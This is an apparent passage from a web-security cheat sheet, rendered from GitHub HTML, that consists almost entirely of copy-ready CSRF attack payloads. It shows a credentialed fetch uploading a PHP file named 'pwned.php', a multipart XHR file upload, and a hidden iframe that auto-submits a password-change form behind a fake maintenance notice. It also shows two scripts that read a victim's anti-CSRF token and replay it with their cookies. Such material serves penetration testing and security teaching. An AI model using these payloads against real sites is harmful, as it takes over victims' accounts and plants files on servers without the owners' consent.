<h3 dir="auto"><a id="user-content-multipartform-data-post-request" class="anchor" aria-hidden="true" href="#multipartform-data-post-request"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>multipart/form-data POST request</h3>
<div class="highlight highlight-source-js position-relative overflow-auto"><pre><span class="pl-s1">myFormData</span> <span class="pl-c1">=</span> <span class="pl-k">new</span> <span class="pl-v">FormData</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
<span class="pl-k">var</span> <span class="pl-s1">blob</span> <span class="pl-c1">=</span> <span class="pl-k">new</span> <span class="pl-v">Blob</span><span class="pl-kos">(</span><span class="pl-kos">[</span><span class="pl-s">"&lt;?php phpinfo(); ?&gt;"</span><span class="pl-kos">]</span><span class="pl-kos">,</span> <span class="pl-kos">{</span> <span class="pl-c1">type</span>: <span class="pl-s">"text/text"</span><span class="pl-kos">}</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
<span class="pl-s1">myFormData</span><span class="pl-kos">.</span><span class="pl-en">append</span><span class="pl-kos">(</span><span class="pl-s">"newAttachment"</span><span class="pl-kos">,</span> <span class="pl-s1">blob</span><span class="pl-kos">,</span> <span class="pl-s">"pwned.php"</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
<span class="pl-en">fetch</span><span class="pl-kos">(</span><span class="pl-s">"http://example/some/path"</span><span class="pl-kos">,</span> <span class="pl-kos">{</span>
    <span class="pl-c1">method</span>: <span class="pl-s">"post"</span><span class="pl-kos">,</span>
    <span class="pl-c1">body</span>: <span class="pl-s1">myFormData</span><span class="pl-kos">,</span>
    <span class="pl-c1">credentials</span>: <span class="pl-s">"include"</span><span class="pl-kos">,</span>
    <span class="pl-c1">headers</span>: <span class="pl-kos">{</span><span class="pl-s">"Content-Type"</span>: <span class="pl-s">"application/x-www-form-urlencoded"</span><span class="pl-kos">}</span><span class="pl-kos">,</span>
    <span class="pl-c1">mode</span>: <span class="pl-s">"no-cors"</span>
<span class="pl-kos">}</span><span class="pl-kos">)</span><span class="pl-kos">;</span></pre><div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w" value="myFormData = new FormData();
var blob = new Blob([&quot;<?php phpinfo(); ?>&quot;], { type: &quot;text/text&quot;});
myFormData.append(&quot;newAttachment&quot;, blob, &quot;pwned.php&quot;);
fetch(&quot;http://example/some/path&quot;, {
    method: &quot;post&quot;,
    body: myFormData,
    credentials: &quot;include&quot;,
    headers: {&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;},
    mode: &quot;no-cors&quot;
});
" tabindex="0" role="button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-text-success d-none m-2">
    <path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
</svg>
    </clipboard-copy>
  </div></div>
<h3 dir="auto"><a id="user-content-multipartform-data-post-request-v2" class="anchor" aria-hidden="true" href="#multipartform-data-post-request-v2"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>multipart/form-data POST request v2</h3>
<div class="highlight highlight-source-js position-relative overflow-auto"><pre><span class="pl-k">var</span> <span class="pl-s1">fileSize</span> <span class="pl-c1">=</span> <span class="pl-s1">fileData</span><span class="pl-kos">.</span><span class="pl-c1">length</span><span class="pl-kos">,</span>
<span class="pl-s1">boundary</span> <span class="pl-c1">=</span> <span class="pl-s">"OWNEDBYOFFSEC"</span><span class="pl-kos">,</span>
<span class="pl-s1">xhr</span> <span class="pl-c1">=</span> <span class="pl-k">new</span> <span class="pl-v">XMLHttpRequest</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
<span class="pl-s1">xhr</span><span class="pl-kos">.</span><span class="pl-c1">withCredentials</span> <span class="pl-c1">=</span> <span class="pl-c1">true</span><span class="pl-kos">;</span>
<span class="pl-s1">xhr</span><span class="pl-kos">.</span><span class="pl-en">open</span><span class="pl-kos">(</span><span class="pl-s">"POST"</span><span class="pl-kos">,</span> <span class="pl-s1">url</span><span class="pl-kos">,</span> <span class="pl-c1">true</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
<span class="pl-c">//  MIME POST request.</span>
<span class="pl-s1">xhr</span><span class="pl-kos">.</span><span class="pl-en">setRequestHeader</span><span class="pl-kos">(</span><span class="pl-s">"Content-Type"</span><span class="pl-kos">,</span> <span class="pl-s">"multipart/form-data, boundary="</span><span class="pl-c1">+</span><span class="pl-s1">boundary</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
<span class="pl-s1">xhr</span><span class="pl-kos">.</span><span class="pl-en">setRequestHeader</span><span class="pl-kos">(</span><span class="pl-s">"Content-Length"</span><span class="pl-kos">,</span> <span class="pl-s1">fileSize</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
<span class="pl-k">var</span> <span class="pl-s1">body</span> <span class="pl-c1">=</span> <span class="pl-s">"--"</span> <span class="pl-c1">+</span> <span class="pl-s1">boundary</span> <span class="pl-c1">+</span> <span class="pl-s">"\r\n"</span><span class="pl-kos">;</span>
<span class="pl-s1">body</span> <span class="pl-c1">+=</span> <span class="pl-s">'Content-Disposition: form-data; name="'</span> <span class="pl-c1">+</span> <span class="pl-s1">nameVar</span> <span class="pl-c1">+</span><span class="pl-s">'"; filename="'</span> <span class="pl-c1">+</span> <span class="pl-s1">fileName</span> <span class="pl-c1">+</span> <span class="pl-s">'"\r\n'</span><span class="pl-kos">;</span>
<span class="pl-s1">body</span> <span class="pl-c1">+=</span> <span class="pl-s">"Content-Type: "</span> <span class="pl-c1">+</span> <span class="pl-s1">ctype</span> <span class="pl-c1">+</span> <span class="pl-s">"\r\n\r\n"</span><span class="pl-kos">;</span>
<span class="pl-s1">body</span> <span class="pl-c1">+=</span> <span class="pl-s1">fileData</span> <span class="pl-c1">+</span> <span class="pl-s">"\r\n"</span><span class="pl-kos">;</span>
<span class="pl-s1">body</span> <span class="pl-c1">+=</span> <span class="pl-s">"--"</span> <span class="pl-c1">+</span> <span class="pl-s1">boundary</span> <span class="pl-c1">+</span> <span class="pl-s">"--"</span><span class="pl-kos">;</span>

<span class="pl-c">//xhr.send(body);</span>
<span class="pl-s1">xhr</span><span class="pl-kos">.</span><span class="pl-en">sendAsBinary</span><span class="pl-kos">(</span><span class="pl-s1">body</span><span class="pl-kos">)</span><span class="pl-kos">;</span></pre><div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w" value="var fileSize = fileData.length,
boundary = &quot;OWNEDBYOFFSEC&quot;,
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open(&quot;POST&quot;, url, true);
//  MIME POST request.
xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;multipart/form-data, boundary=&quot;+boundary);
xhr.setRequestHeader(&quot;Content-Length&quot;, fileSize);
var body = &quot;--&quot; + boundary + &quot;\r\n&quot;;
body += 'Content-Disposition: form-data; name=&quot;' + nameVar +'&quot;; filename=&quot;' + fileName + '&quot;\r\n';
body += &quot;Content-Type: &quot; + ctype + &quot;\r\n\r\n&quot;;
body += fileData + &quot;\r\n&quot;;
body += &quot;--&quot; + boundary + &quot;--&quot;;

//xhr.send(body);
xhr.sendAsBinary(body);
" tabindex="0" role="button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-text-success d-none m-2">
    <path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
</svg>
    </clipboard-copy>
  </div></div>
<h3 dir="auto"><a id="user-content-form-post-request-from-within-an-iframe" class="anchor" aria-hidden="true" href="#form-post-request-from-within-an-iframe"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Form POST request from within an iframe</h3>
<div class="snippet-clipboard-content position-relative overflow-auto"><pre lang="markup"><code>&lt;--! expl.html --&gt;

&lt;body onload="envia()"&gt;
&lt;form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php"&gt;
&lt;input type="text" id="pwd" name="pwd" value="otra nueva"&gt;
&lt;/form&gt;
&lt;body&gt;
&lt;script&gt;
function envia(){document.getElementById("formulario").submit();}
&lt;/script&gt;

&lt;!-- public.html --&gt;
&lt;iframe src="2-1.html" style="position:absolute;top:-5000"&gt;
&lt;/iframe&gt;
&lt;h1&gt;Sitio bajo mantenimiento. Disculpe las molestias&lt;/h1&gt;
</code></pre><div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w" value="<--! expl.html -->

<body onload=&quot;envia()&quot;>
<form method=&quot;POST&quot;id=&quot;formulario&quot; action=&quot;http://aplicacion.example.com/cambia_pwd.php&quot;>
<input type=&quot;text&quot; id=&quot;pwd&quot; name=&quot;pwd&quot; value=&quot;otra nueva&quot;>
</form>
<body>
<script>
function envia(){document.getElementById(&quot;formulario&quot;).submit();}
</script>

<!-- public.html -->
<iframe src=&quot;2-1.html&quot; style=&quot;position:absolute;top:-5000&quot;>
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
" tabindex="0" role="button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-text-success d-none m-2">
    <path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
</svg>
    </clipboard-copy>
  </div></div>
<h3 dir="auto"><a id="user-content-steal-csrf-token-and-send-a-post-request" class="anchor" aria-hidden="true" href="#steal-csrf-token-and-send-a-post-request"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a><strong>Steal CSRF Token and send a POST request</strong></h3>
<div class="highlight highlight-source-js position-relative overflow-auto"><pre><span class="pl-k">function</span> <span class="pl-en">submitFormWithTokenJS</span><span class="pl-kos">(</span><span class="pl-s1">token</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
    <span class="pl-k">var</span> <span class="pl-s1">xhr</span> <span class="pl-c1">=</span> <span class="pl-k">new</span> <span class="pl-v">XMLHttpRequest</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
    <span class="pl-s1">xhr</span><span class="pl-kos">.</span><span class="pl-en">open</span><span class="pl-kos">(</span><span class="pl-s">"POST"</span><span class="pl-kos">,</span> <span class="pl-c1">POST_URL</span><span class="pl-kos">,</span> <span class="pl-c1">true</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
    <span class="pl-s1">xhr</span><span class="pl-kos">.</span><span class="pl-c1">withCredentials</span> <span class="pl-c1">=</span> <span class="pl-c1">true</span><span class="pl-kos">;</span>

    <span class="pl-c">// Send the proper header information along with the request</span>
    <span class="pl-s1">xhr</span><span class="pl-kos">.</span><span class="pl-en">setRequestHeader</span><span class="pl-kos">(</span><span class="pl-s">"Content-type"</span><span class="pl-kos">,</span> <span class="pl-s">"application/x-www-form-urlencoded"</span><span class="pl-kos">)</span><span class="pl-kos">;</span>

    <span class="pl-c">// This is for debugging and can be removed</span>
    <span class="pl-s1">xhr</span><span class="pl-kos">.</span><span class="pl-en">onreadystatechange</span> <span class="pl-c1">=</span> <span class="pl-k">function</span><span class="pl-kos">(</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
        <span class="pl-k">if</span><span class="pl-kos">(</span><span class="pl-s1">xhr</span><span class="pl-kos">.</span><span class="pl-c1">readyState</span> <span class="pl-c1">===</span> <span class="pl-v">XMLHttpRequest</span><span class="pl-kos">.</span><span class="pl-c1">DONE</span> <span class="pl-c1">&amp;&amp;</span> <span class="pl-s1">xhr</span><span class="pl-kos">.</span><span class="pl-c1">status</span> <span class="pl-c1">===</span> <span class="pl-c1">200</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
            <span class="pl-c">//console.log(xhr.responseText);</span>
        <span class="pl-kos">}</span>
    <span class="pl-kos">}</span>

    <span class="pl-s1">xhr</span><span class="pl-kos">.</span><span class="pl-en">send</span><span class="pl-kos">(</span><span class="pl-s">"token="</span> <span class="pl-c1">+</span> <span class="pl-s1">token</span> <span class="pl-c1">+</span> <span class="pl-s">"&amp;otherparama=heyyyy"</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
<span class="pl-kos">}</span>

<span class="pl-k">function</span> <span class="pl-en">getTokenJS</span><span class="pl-kos">(</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
    <span class="pl-k">var</span> <span class="pl-s1">xhr</span> <span class="pl-c1">=</span> <span class="pl-k">new</span> <span class="pl-v">XMLHttpRequest</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
    <span class="pl-c">// This tels it to return it as a HTML document</span>
    <span class="pl-s1">xhr</span><span class="pl-kos">.</span><span class="pl-c1">responseType</span> <span class="pl-c1">=</span> <span class="pl-s">"document"</span><span class="pl-kos">;</span>
    <span class="pl-s1">xhr</span><span class="pl-kos">.</span><span class="pl-c1">withCredentials</span> <span class="pl-c1">=</span> <span class="pl-c1">true</span><span class="pl-kos">;</span>
    <span class="pl-c">// true on the end of here makes the call asynchronous</span>
    <span class="pl-s1">xhr</span><span class="pl-kos">.</span><span class="pl-en">open</span><span class="pl-kos">(</span><span class="pl-s">"GET"</span><span class="pl-kos">,</span> <span class="pl-c1">GET_URL</span><span class="pl-kos">,</span> <span class="pl-c1">true</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
    <span class="pl-s1">xhr</span><span class="pl-kos">.</span><span class="pl-en">onload</span> <span class="pl-c1">=</span> <span class="pl-k">function</span> <span class="pl-kos">(</span><span class="pl-s1">e</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
        <span class="pl-k">if</span> <span class="pl-kos">(</span><span class="pl-s1">xhr</span><span class="pl-kos">.</span><span class="pl-c1">readyState</span> <span class="pl-c1">===</span> <span class="pl-v">XMLHttpRequest</span><span class="pl-kos">.</span><span class="pl-c1">DONE</span> <span class="pl-c1">&amp;&amp;</span> <span class="pl-s1">xhr</span><span class="pl-kos">.</span><span class="pl-c1">status</span> <span class="pl-c1">===</span> <span class="pl-c1">200</span><span class="pl-kos">)</span> <span class="pl-kos">{</span>
            <span class="pl-c">// Get the document from the response</span>
            <span class="pl-s1">page</span> <span class="pl-c1">=</span> <span class="pl-s1">xhr</span><span class="pl-kos">.</span><span class="pl-c1">response</span>
            <span class="pl-c">// Get the input element</span>
            <span class="pl-s1">input</span> <span class="pl-c1">=</span> <span class="pl-s1">page</span><span class="pl-kos">.</span><span class="pl-en">getElementById</span><span class="pl-kos">(</span><span class="pl-s">"token"</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
            <span class="pl-c">// Show the token</span>
            <span class="pl-c">//console.log("The token is: " + input.value);</span>
            <span class="pl-c">// Use the token to submit the form</span>
            <span class="pl-en">submitFormWithTokenJS</span><span class="pl-kos">(</span><span class="pl-s1">input</span><span class="pl-kos">.</span><span class="pl-c1">value</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
        <span class="pl-kos">}</span>
    <span class="pl-kos">}</span><span class="pl-kos">;</span>
    <span class="pl-c">// Make the request</span>
    <span class="pl-s1">xhr</span><span class="pl-kos">.</span><span class="pl-en">send</span><span class="pl-kos">(</span><span class="pl-c1">null</span><span class="pl-kos">)</span><span class="pl-kos">;</span>
<span class="pl-kos">}</span>

<span class="pl-k">var</span> <span class="pl-c1">GET_URL</span><span class="pl-c1">=</span><span class="pl-s">"http://google.com?param=VALUE"</span>
<span class="pl-k">var</span> <span class="pl-c1">POST_URL</span><span class="pl-c1">=</span><span class="pl-s">"http://google.com?param=VALUE"</span>
<span class="pl-en">getTokenJS</span><span class="pl-kos">(</span><span class="pl-kos">)</span><span class="pl-kos">;</span></pre><div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w" value="function submitFormWithTokenJS(token) {
    var xhr = new XMLHttpRequest();
    xhr.open(&quot;POST&quot;, POST_URL, true);
    xhr.withCredentials = true;

    // Send the proper header information along with the request
    xhr.setRequestHeader(&quot;Content-type&quot;, &quot;application/x-www-form-urlencoded&quot;);

    // This is for debugging and can be removed
    xhr.onreadystatechange = function() {
        if(xhr.readyState === XMLHttpRequest.DONE &amp;&amp; xhr.status === 200) {
            //console.log(xhr.responseText);
        }
    }

    xhr.send(&quot;token=&quot; + token + &quot;&amp;otherparama=heyyyy&quot;);
}

function getTokenJS() {
    var xhr = new XMLHttpRequest();
    // This tels it to return it as a HTML document
    xhr.responseType = &quot;document&quot;;
    xhr.withCredentials = true;
    // true on the end of here makes the call asynchronous
    xhr.open(&quot;GET&quot;, GET_URL, true);
    xhr.onload = function (e) {
        if (xhr.readyState === XMLHttpRequest.DONE &amp;&amp; xhr.status === 200) {
            // Get the document from the response
            page = xhr.response
            // Get the input element
            input = page.getElementById(&quot;token&quot;);
            // Show the token
            //console.log(&quot;The token is: &quot; + input.value);
            // Use the token to submit the form
            submitFormWithTokenJS(input.value);
        }
    };
    // Make the request
    xhr.send(null);
}

var GET_URL=&quot;http://google.com?param=VALUE&quot;
var POST_URL=&quot;http://google.com?param=VALUE&quot;
getTokenJS();
" tabindex="0" role="button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-text-success d-none m-2">
    <path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
</svg>
    </clipboard-copy>
  </div></div>
<h3 dir="auto"><a id="user-content-steal-csrf-token-and-send-a-post-request-using-an-iframe-a-form-and-ajax" class="anchor" aria-hidden="true" href="#steal-csrf-token-and-send-a-post-request-using-an-iframe-a-form-and-ajax"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a><strong>Steal CSRF Token and send a Post request using an iframe, a form and Ajax</strong></h3>
<div class="snippet-clipboard-content position-relative overflow-auto"><pre lang="markup"><code>&lt;form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data"&gt;
&lt;input type="text" name="username" value="AA"&gt;
&lt;input type="checkbox" name="status" checked="checked"&gt;
&lt;input id="token" type="hidden" name="token" value="" /&gt;
&lt;/form&gt;

&lt;script type="text/javascript"&gt;
function f1(){
    x1=document.getElementById("i1");
    x1d=(x1.contentWindow||x1.contentDocument);
    t=x1d.document.getElementById("token").value;
    
    document.getElementById("token").value=t;
    document.getElementById("form1").submit();
}
&lt;/script&gt; 
&lt;iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"&gt;&lt;/iframe&gt;
</code></pre><div class="zeroclipboard-container position-absolute right-0 top-0">
    <clipboard-copy aria-label="Copy" class="ClipboardButton btn js-clipboard-copy m-2 p-0 tooltipped-no-delay" data-copy-feedback="Copied!" data-tooltip-direction="w" value="<form id=&quot;form1&quot; action=&quot;http://google.com?param=VALUE&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;>
<input type=&quot;text&quot; name=&quot;username&quot; value=&quot;AA&quot;>
<input type=&quot;checkbox&quot; name=&quot;status&quot; checked=&quot;checked&quot;>
<input id=&quot;token&quot; type=&quot;hidden&quot; name=&quot;token&quot; value=&quot;&quot; />
</form>

<script type=&quot;text/javascript&quot;>
function f1(){
    x1=document.getElementById(&quot;i1&quot;);
    x1d=(x1.contentWindow||x1.contentDocument);
    t=x1d.document.getElementById(&quot;token&quot;).value;
    
    document.getElementById(&quot;token&quot;).value=t;
    document.getElementById(&quot;form1&quot;).submit();
}
</script> 
<iframe id=&quot;i1&quot; style=&quot;display:none&quot; src=&quot;http://google.com?param=VALUE&quot; onload=&quot;javascript:f1();&quot;></iframe>
" tabindex="0" role="button">
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-copy js-clipboard-copy-icon m-2">
    <path fill-rule="evenodd" d="M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 010 1.5h-1.5a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-1.5a.75.75 0 011.5 0v1.5A1.75 1.75 0 019.25 16h-7.5A1.75 1.75 0 010 14.25v-7.5z"></path><path fill-rule="evenodd" d="M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0114.25 11h-7.5A1.75 1.75 0 015 9.25v-7.5zm1.75-.25a.25.25 0 00-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 00.25-.25v-7.5a.25.25 0 00-.25-.25h-7.5z"></path>
</svg>
      <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-check js-clipboard-check-icon color-text-success d-none m-2">
    <path fill-rule="evenodd" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path>
</svg>
    </clipboard-copy>
  </div></div>
